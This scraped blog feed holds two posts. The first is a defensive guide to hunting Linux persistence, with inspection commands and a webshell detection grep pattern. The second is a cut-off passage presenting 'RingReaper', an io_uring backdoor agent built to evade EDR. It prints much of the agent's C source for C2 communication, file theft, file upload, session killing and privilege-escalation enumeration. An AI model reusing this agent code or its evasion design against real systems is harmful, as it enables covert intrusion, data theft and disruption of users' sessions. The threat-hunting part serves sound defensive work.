how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), 